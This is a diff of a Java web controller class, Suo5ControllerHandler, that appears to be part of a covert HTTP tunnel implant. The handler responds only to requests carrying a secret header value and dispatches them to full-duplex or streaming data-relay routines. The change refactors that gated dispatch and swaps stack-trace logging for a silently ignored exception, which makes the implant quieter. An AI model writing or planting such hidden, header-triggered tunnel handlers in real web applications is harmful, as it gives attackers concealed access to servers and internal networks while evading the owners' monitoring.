@@ -26,7 +26,6 @@ public class Suo5ControllerHandler implements Controller, Runnable, HostnameVeri
     InputStream gInStream;
     OutputStream gOutStream;
 
-
     public Suo5ControllerHandler() {
     }
 
@@ -37,29 +36,22 @@ public class Suo5ControllerHandler implements Controller, Runnable, HostnameVeri
 
     public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
         try {
-            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                String contentType = request.getContentType();
-                if (contentType == null) {
+            String contentType = request.getContentType();
+            if (request.getHeader(headerName) != null
+                    && request.getHeader(headerName).contains(headerValue)
+                    && contentType != null) {
+                if (contentType.equals("application/plain")) {
+                    tryFullDuplex(request, response);
                     return null;
                 }
-                try {
-                    if (contentType.equals("application/plain")) {
-                        tryFullDuplex(request, response);
-                        return null;
-                    }
 
-                    if (contentType.equals("application/octet-stream")) {
-                        processDataBio(request, response);
-                    } else {
-                        processDataUnary(request, response);
-                    }
-                } catch (Throwable e) {
-//                System.out.printf("process data error %s\n", e);
-//                e.printStackTrace();
+                if (contentType.equals("application/octet-stream")) {
+                    processDataBio(request, response);
+                } else {
+                    processDataUnary(request, response);
                 }
             }
-        } catch (Exception e) {
-            e.printStackTrace();
+        } catch (Exception ignored) {
         }
         return null;
     }
